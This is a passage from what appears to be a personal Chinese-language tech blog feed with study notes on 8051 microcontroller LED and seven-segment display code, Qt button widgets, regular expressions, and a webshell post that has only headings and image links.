class="hljs-number">500</span>);<br>    P2 = <span class="hljs-number">0xFE</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">if</span> (P3_1 == <span class="hljs-number">0</span>) &#123;<br>            Delay(<span class="hljs-number">20</span>);<br>            <span class="hljs-keyword">while</span> (P3_1 == <span class="hljs-number">0</span>)<br>                ;<br>            Delay(<span class="hljs-number">20</span>);<br>   <br>            P2 = _cror_(P2, <span class="hljs-number">1</span>);<br>        &#125;<br>   <br>        <span class="hljs-keyword">if</span> (P3_3 == <span class="hljs-number">0</span>) &#123;<br>            Delay(<span class="hljs-number">20</span>);<br>            <span class="hljs-keyword">while</span> (P3_3 == <span class="hljs-number">0</span>)<br>                ;<br>            Delay(<span class="hljs-number">20</span>);<br>   <br>            P2 = _crol_(P2, <span class="hljs-number">1</span>);<br>        &#125;<br>   <br>        <span class="hljs-keyword">if</span> (P3_0 == <span class="hljs-number">0</span>) &#123;<br>            Delay(<span class="hljs-number">20</span>);<br>            <span class="hljs-keyword">while</span> (P3_0 == <span class="hljs-number">0</span>)<br>                ;<br>            Delay(<span class="hljs-number">20</span>);<br>   <br>            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">7</span>; i++) &#123;<br>                LED_PORT = _crol_(LED_PORT, <span class="hljs-number">1</span>); <span class="hljs-comment">//往左移</span><br>                Delay(<span class="hljs-number">100</span>);<br>            &#125;<br>            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">7</span>; i++) &#123;<br>                LED_PORT = _cror_(LED_PORT, <span class="hljs-number">1</span>); <span class="hljs-comment">//往右移</span><br>                Delay(<span class="hljs-number">100</span>);<br>            &#125;<br>   <br>            P3_0 = <span class="hljs-number">1</span>;<br>        &#125;<br>   <br>        <span class="hljs-keyword">if</span> (P3_2 == <span class="hljs-number">0</span>) &#123;<br>            Delay(<span class="hljs-number">20</span>);<br>            <span class="hljs-keyword">while</span> (P3_2 == <span class="hljs-number">0</span>)<br>                ;<br>            Delay(<span class="hljs-number">20</span>);<br>   <br>            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>                LED_PORT = _crol_(LED_PORT, <span class="hljs-number">2</span>); <span class="hljs-comment">//往左移</span><br>                Delay(<span class="hljs-number">100</span>);<br>            &#125;<br>            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>                LED_PORT = _cror_(LED_PORT, <span class="hljs-number">2</span>); <span class="hljs-comment">//往右移</span><br>                Delay(<span class="hljs-number">100</span>);<br>            &#125;<br>   <br>            P3_2 = <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>   <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="数码管"><a href="#数码管" class="headerlink" title="数码管"></a>数码管</h2><h3 id="静态数码管"><a href="#静态数码管" class="headerlink" title="静态数码管"></a>静态数码管</h3><ol><li><p>点亮一个数码管的数字</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;REGX52.H&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrins.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> u16;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u8;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> u4;<br><br><span class="hljs-comment">//在led打印的数组</span><br>u4 printLedNum[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0x3F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x7D</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0x6F</span>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Delay</span><span class="hljs-params">(u16 xms)</span> <span class="hljs-comment">//@11.0592MHz</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data i, j;<br>    <span class="hljs-keyword">while</span> (xms--) &#123;<br>        _nop_();<br>        i = <span class="hljs-number">2</span>;<br>        j = <span class="hljs-number">199</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">while</span> (--j)<br>                ;<br>        &#125; <span class="hljs-keyword">while</span> (--i);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">printSix</span><span class="hljs-params">()</span><br>&#123;<br>    P2_2 = <span class="hljs-number">1</span>;<br>    P2_3 = <span class="hljs-number">0</span>;<br>    P2_4 = <span class="hljs-number">1</span>;<br><br>    P0 = <span class="hljs-number">0x7D</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">DigitalTube</span><span class="hljs-params">(u4 LEDNum, u4 num)</span><br>&#123;<br>    <span class="hljs-keyword">switch</span> (LEDNum) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            P2_2 = <span class="hljs-number">1</span>;<br>            P2_3 = <span class="hljs-number">1</span>;<br>            P2_4 = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            P2_2 = <span class="hljs-number">0</span>;<br>            P2_3 = <span class="hljs-number">1</span>;<br>            P2_4 = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            P2_2 = <span class="hljs-number">1</span>;<br>            P2_3 = <span class="hljs-number">0</span>;<br>            P2_4 = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            P2_2 = <span class="hljs-number">0</span>;<br>            P2_3 = <span class="hljs-number">0</span>;<br>            P2_4 = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>            P2_2 = <span class="hljs-number">1</span>;<br>            P2_3 = <span class="hljs-number">1</span>;<br>            P2_4 = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>            P2_2 = <span class="hljs-number">0</span>;<br>            P2_3 = <span class="hljs-number">1</span>;<br>            P2_4 = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>            P2_2 = <span class="hljs-number">1</span>;<br>            P2_3 = <span class="hljs-number">0</span>;<br>            P2_4 = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            P2_2 = <span class="hljs-number">0</span>;<br>            P2_3 = <span class="hljs-number">0</span>;<br>            P2_4 = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    P0 = printLedNum[num];<br><br>    <span class="hljs-comment">//由于led电子管的使用饭方式是 位选  段选   位选  段选，每一个（位选 段选）是一个集合，控制一个LED</span><br>    <span class="hljs-comment">//但是由于运行效率极高，所以上阶段段选会进入到下一阶段的位选当中，所以我们需要人为的进行消影</span><br>    Delay(<span class="hljs-number">1</span>);<span class="hljs-comment">//这里延迟的原因是因为，直接归零的话显示的效果就会不明显</span><br>    P0=<span class="hljs-number">0x00</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        DigitalTube(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br>        DigitalTube(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>);<br>        DigitalTube(<span class="hljs-number">5</span>, <span class="hljs-number">5</span>);<br>        DigitalTube(<span class="hljs-number">7</span>, <span class="hljs-number">7</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>51单片机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QT控件认识</title>
    <link href="/2023/08/03/QT/QT%E6%8E%A7%E4%BB%B6%E8%AE%A4%E8%AF%86/"/>
    <url>/2023/08/03/QT/QT%E6%8E%A7%E4%BB%B6%E8%AE%A4%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="QT控件认识"><a href="#QT控件认识" class="headerlink" title="QT控件认识"></a>QT控件认识</h1><p>学习控件需要培养起来查帮助文档的习惯</p><p>首先我们查父类，按照以下顺序</p><p>信号-&gt;槽函数-&gt;public function-&gt;others</p><h2 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/qt1/image-20230811212601338.png" alt="image-20230811212601338"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/qt/%E6%8E%A7%E4%BB%B6%E6%8C%89%E9%92%AE%E7%9A%84%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB" alt="image-20230803091229228"></p><h3 id="QAbstractButton"><a href="#QAbstractButton" class="headerlink" title="QAbstractButton"></a>QAbstractButton</h3><ol><li><p>槽函数</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/qt/%E6%8E%A7%E4%BB%B6QAbstractButton%E6%A7%BD%E5%87%BD%E6%95%B0" alt="image-20230803092521012"></p></li><li><p>信号</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/qt/%E6%8E%A7%E4%BB%B6qabstractButton" alt="image-20230803092957579"></p></li></ol><h3 id="QPushButton"><a href="#QPushButton" class="headerlink" title="QPushButton"></a>QPushButton</h3><ol><li><p>普通的按钮，继承于QAstrctButton</p></li><li><p>下面是具体的用法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++">qtTest_control::<span class="hljs-built_in">qtTest_control</span>(QWidget *parent)<br>    : <span class="hljs-built_in">QMainWindow</span>(parent)<br>&#123;<br>    ui.<span class="hljs-built_in">setupUi</span>(<span class="hljs-keyword">this</span>);<br>   <br>    <span class="hljs-comment">//普通按钮</span><br>    ui.nomalBtu-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;屌丝&quot;</span>);<br>    ui.nomalBtu-&gt;<span class="hljs-built_in">setIcon</span>(<span class="hljs-built_in">QIcon</span>(<span class="hljs-string">&quot;:/1&quot;</span>));<br>   <br>   <br>   <br>    <span class="hljs-comment">//check按钮</span><br>    ui.checkBtn-&gt;<span class="hljs-built_in">setCheckable</span>(<span class="hljs-literal">true</span>);<span class="hljs-comment">//设置成可选中的状态，也就是颜色会加深</span><br>    ui.checkBtn-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;屌丝二号&quot;</span>);<br>    ui.checkBtn-&gt;<span class="hljs-built_in">setIcon</span>(<span class="hljs-built_in">QIcon</span>(<span class="hljs-string">&quot;:/2&quot;</span>));<br>   <br>    <span class="hljs-built_in">connect</span>(ui.checkBtn, &amp;QPushButton::toggled, <span class="hljs-keyword">this</span>, [=]() &#123;<br>        QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;check&quot;</span>,<span class="hljs-string">&quot;你是大屌丝二号&quot;</span>);<br>   <br>        &#125;);<span class="hljs-comment">//当点击的是子图标，发出信号</span><br>   <br>   <br>    <span class="hljs-comment">//关联按钮</span><br>    QMenu* menuForwithMenu = <span class="hljs-keyword">new</span> <span class="hljs-built_in">QMenu</span>(<span class="hljs-literal">nullptr</span>);<br>    QAction* act1=menuForwithMenu-&gt;<span class="hljs-built_in">addAction</span>(<span class="hljs-built_in">QIcon</span>(<span class="hljs-string">&quot;://3&quot;</span>), <span class="hljs-string">&quot;选项一&quot;</span>);<br>    ui.withMenu-&gt;<span class="hljs-built_in">setMenu</span>(menuForwithMenu);<br>    <span class="hljs-built_in">connect</span>(act1, &amp;QAction::triggered, <span class="hljs-keyword">this</span>, [=]() &#123;<br>        QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;选项&quot;</span>, <span class="hljs-string">&quot;这个是选项一&quot;</span>);<br>        &#125;);<br>   <br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="QToolButton"><a href="#QToolButton" class="headerlink" title="QToolButton"></a>QToolButton</h3><ol><li><p>加强版的QPushButton，并且做的更漂亮 </p></li><li><p>设置图标的方式</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/qt/%E6%8E%A7%E4%BB%B6qtoolButton%E8%AE%BE%E7%BD%AE%E5%9B%BE%E6%A0%87%E7%9A%84%E6%96%B9%E5%BC%8F" alt="image-20230803141949916"></p></li><li><p>下面是一些具体的做法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//toolButton   图片</span><br>QAction* atc2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">QAction</span>(<span class="hljs-built_in">QIcon</span>(<span class="hljs-string">&quot;:/4&quot;</span>),<span class="hljs-string">&quot;图片按钮&quot;</span>);<br>ui.pictureToolBtn-&gt;<span class="hljs-built_in">setDefaultAction</span>(atc2);<br><span class="hljs-built_in">connect</span>(atc2, &amp;QAction::triggered, <span class="hljs-keyword">this</span>, [=]() &#123;<br>    atc2-&gt;<span class="hljs-built_in">setIcon</span>(<span class="hljs-built_in">QIcon</span>(<span class="hljs-string">&quot;:/5&quot;</span>));<br>    atc2-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新的图片&quot;</span>);<br>    &#125;);<br>ui.pictureToolBtn-&gt;<span class="hljs-built_in">setToolButtonStyle</span>(Qt::ToolButtonTextUnderIcon);<br>   <br>   <br><span class="hljs-comment">//toolButton   箭头</span><br>ui.arrowBtn-&gt;<span class="hljs-built_in">setArrowType</span>(Qt::UpArrow);<br>ui.arrowBtn-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;向上&quot;</span>);<br>ui.arrowBtn-&gt;<span class="hljs-built_in">setToolButtonStyle</span>(Qt::ToolButtonTextUnderIcon);<br>   <br><span class="hljs-built_in">connect</span>(ui.arrowBtn, &amp;QToolButton::clicked, <span class="hljs-keyword">this</span>, [=]() &#123;<br>    <span class="hljs-keyword">if</span> (ui.arrowBtn-&gt;<span class="hljs-built_in">arrowType</span>() == Qt::UpArrow) &#123;<br>        ui.arrowBtn-&gt;<span class="hljs-built_in">setArrowType</span>(Qt::DownArrow);<br>        ui.arrowBtn-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;向下&quot;</span>);<br>        ui.arrowBtn-&gt;<span class="hljs-built_in">setToolButtonStyle</span>(Qt::ToolButtonTextUnderIcon);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        ui.arrowBtn-&gt;<span class="hljs-built_in">setArrowType</span>(Qt::UpArrow);<br>        ui.arrowBtn-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;向上&quot;</span>);<br>        ui.arrowBtn-&gt;<span class="hljs-built_in">setToolButtonStyle</span>(Qt::ToolButtonTextUnderIcon);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>由于这个button和pushButton的效果都差不多，就只描述了不一样的一些东西</p><p>下面是他们的样子</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/qt/%E6%8E%A7%E4%BB%B6image-20230803142206611.png" alt="image-20230803142206611"></p></li><li><p>弹出菜单的形式以及clicked信号的捕捉</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++">    <span class="hljs-comment">// toolButton   弹出菜单</span><br>    ui.menuToolBtn-&gt;<span class="hljs-built_in">setMenu</span>(menuForwithMenu);<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">弹出菜单的弹出模式是一个枚举类型: QToolButton::ToolButtonPopupMode, 取值如下:</span><br><span class="hljs-comment">    - QToolButton::DelayedPopup:</span><br><span class="hljs-comment">        - 延时弹出, 按压工具按钮一段时间后才能弹出, 比如:浏览器的返回按钮</span><br><span class="hljs-comment">        - 长按按钮菜单弹出, 但是按钮的 clicked 信号不会被发射</span><br><span class="hljs-comment">    - QToolButton::MenuButtonPopup:</span><br><span class="hljs-comment">        - 在这种模式下，工具按钮会显示一个特殊的箭头，表示有菜单。</span><br><span class="hljs-comment">    - 当按下按钮的箭头部分时，将显示菜单。按下按钮部分发射 clicked 信号</span><br><span class="hljs-comment">    - QToolButton::InstantPopup:</span><br><span class="hljs-comment">        - 当按下工具按钮时，菜单立即显示出来。</span><br><span class="hljs-comment">        - 在这种模式下，按钮本身的动作不会被触发(不会发射clicked信号</span><br><span class="hljs-comment">*/</span><br>    <span class="hljs-comment">//检测什么时候有信号</span><br>    ui.menuToolBtn-&gt;<span class="hljs-built_in">setPopupMode</span>(QToolButton::InstantPopup);<br>    <span class="hljs-built_in">connect</span>(ui.menuToolBtn, &amp;QToolButton::clicked, <span class="hljs-keyword">this</span>, [=]() &#123;<br>        QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;成功&quot;</span>, <span class="hljs-string">&quot;检查到信号&quot;</span>);<br>        &#125;);<br>   <br>    <span class="hljs-comment">//检查结果，默认的延迟菜单，当点击的时候有信号但是我们长安的时候没有信号(QToolButton::DelayedPopup:)</span><br>    <span class="hljs-comment">// 当带有箭头的按钮的时候，点击非按钮区有信号，点击箭头没有信号(    - QToolButton::MenuButtonPopup:)</span><br>    <span class="hljs-comment">// 无论什么形式的点击都不会有信号（QToolButton::InstantPopup:） </span><br>    <span class="hljs-comment">//</span><br>   <br></code></pre></td></tr></table></figure></li></ol><h3 id="QRadioButton"><a href="#QRadioButton" class="headerlink" title="QRadioButton"></a>QRadioButton</h3><p>这个按钮是一个单选按钮，没有自己的信号，槽函数，和公共函数，所有的东西都是继承于<code>QAbstractButton</code>,主要是用于按钮组当中</p><p>对于单选按钮的分组，通常将按钮放置于不同的容器当中，每个容器当中的按钮就是一组</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/qt1/image-20230811211222605.png" alt="image-20230811211222605"></p><p>通常使用下面这个容器，因为可以提供标题</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/qt1/image-20230811212108272.png" alt="image-20230811212108272"></p><h3 id="QCheckBox"><a href="#QCheckBox" class="headerlink" title="QCheckBox"></a>QCheckBox</h3><p>复选框按钮，也就是支持多选</p><p>对于单选按钮来说，QCheckBox支持选中后取消选中</p>]]></content>
    
    
    
    <tags>
      
      <tag>QT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>webshell原理</title>
    <link href="/2023/08/01/others/powershell%E5%8E%9F%E7%90%86/"/>
    <url>/2023/08/01/others/powershell%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><h2 id="web的工作原理"><a href="#web的工作原理" class="headerlink" title="web的工作原理"></a>web的工作原理</h2><h3 id="GET和POST传参"><a href="#GET和POST传参" class="headerlink" title="GET和POST传参"></a>GET和POST传参</h3><ol><li>GET传参是从url网址的后面传入</li></ol><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/webshell/image-20230801145504139.png" alt="image-20230801145504139"></p><h2 id="远控木马"><a href="#远控木马" class="headerlink" title="远控木马"></a>远控木马</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/webshell/image-20230801145820858.png" alt="image-20230801145820858"></p>]]></content>
    
    
    
    <tags>
      
      <tag>安全研发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式</title>
    <link href="/2023/07/31/web/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2023/07/31/web/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><ol><li><p>使用[]进行匹配</p></li><li><p>可以使用区间的方式</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/%E5%8C%BA%E9%97%B4%E8%A7%84%E5%88%991" alt="image-20230801084705729"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/%E5%8C%BA%E9%97%B4%E6%B5%8B%E8%AF%95" alt="image-20230801084751543"></p></li><li><p>使用转义字符进行转义</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6" alt="image-20230801084903442"></p></li><li><p>使用取反操作</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/%E5%8F%96%E5%8F%8D" alt="image-20230801085043193"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/%E5%8F%96%E5%8F%8D%E6%93%8D%E4%BD%9C" alt="image-20230801085129023"></p></li></ol><h2 id="快捷键的匹配"><a href="#快捷键的匹配" class="headerlink" title="快捷键的匹配"></a>快捷键的匹配</h2><ol><li><p>匹配字母和数字</p><p>匹配字母：<code>-w</code></p><p>匹配数字：<code>-d</code></p></li><li><p>匹配空白</p><p><code>\s</code></p><p><img src="C:\Users\12414\Desktop\hexo\source_posts\web\正则表达式.assets\image-20230801085446374.png" alt="image-20230801085446374"></p></li><li><p>匹配单词的边界</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/%E5%8C%B9%E9%85%8D%E5%8D%95%E8%AF%8D%E8%BE%B9%E7%95%8C%E7%A4%BA%E4%BE%8B" alt="image-20230801085844782"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/%E5%8C%B9%E9%85%8D%E5%8D%95%E8%AF%8D%E7%BB%83%E4%B9%A0" alt="image-20230801085915050"></p></li><li><p>快捷键取反操作</p><p>就是改小写为大写</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801090459948.png" alt="image-20230801090459948"></p></li><li><p>匹配字符串的结尾和开头</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801123354332.png" alt="image-20230801123354332"></p></li><li><p>匹配任何单个字符</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801123539593.png" alt="image-20230801123539593"></p></li><li><p>匹配一次或0次</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801123809867.png" alt="image-20230801123809867"></p></li><li><p>重复</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801124258603.png" alt="image-20230801124258603"></p></li><li><p>重复区间</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801124425850.png" alt="image-20230801124425850"></p></li><li><p>区间范围</p></li></ol><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801124728907.png" alt="image-20230801124728907"></p><h2 id="进阶笔记"><a href="#进阶笔记" class="headerlink" title="进阶笔记"></a>进阶笔记</h2><ol><li><p>分组</p><p>分组就是字面的意思，我们可以提取这一组的数据</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801141051642.png" alt="image-20230801141051642"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801141404234.png" alt="image-20230801141404234"></p></li><li><p>使用<code>or</code>或者<code>|</code>我们可以匹配多个</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801141605087.png" alt="image-20230801141605087"></p></li><li><p>使用<code>(?:)</code>实现非捕获分组，也就是说我们可以匹配但是我们捕获获取</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E6%AD%A3%E5%88%99/image-20230801141734353.png" alt="image-20230801141734353"></p></li><li><p>分组回溯的使用</p><p>简单的就是引用前面的分组</p><p><img 